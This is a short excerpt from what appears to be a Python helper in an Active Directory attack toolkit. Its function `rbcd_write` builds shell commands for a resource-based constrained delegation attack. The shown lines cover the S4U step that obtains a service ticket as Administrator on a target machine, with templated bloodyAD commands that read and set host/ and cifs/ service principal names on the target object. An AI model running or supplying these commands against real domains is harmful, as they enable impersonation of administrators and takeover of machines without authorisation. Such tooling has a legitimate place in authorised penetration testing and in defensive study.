...
def rbcd_write(domain: str, dc: str, target: str, controlled_computer: str,
    ...
    return [
        ...
        "",
        "# 3. S4U: get a TGS as Administrator for a service on the target.",
        "#    Default SPN is host/<target>. Real domain-joined machines have",
        "#    cifs/, host/, ldap/, etc. registered. Some impacket-addcomputer",
        "#    versions DO NOT auto-register HOST SPNs on freshly-created",
        "#    machine accounts — verify the target has SPNs first:",
        f"#   bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} \\",
        f"#     get object '{target}' --attr servicePrincipalName",
        "#    If empty, set them (creator has WriteProperty on its own object):",
        f"#   bloodyAD -d {domain} -u {username} {pwd_or_hash} --dc-ip {dc} \\",
        f"#     set object '<target-DN>' servicePrincipalName \\",
        f"#       -v 'host/{target_clean}.{domain}' \\",
        f"#       -v 'cifs/{target_clean}.{domain}'",
        "unset KRB5CCNAME",
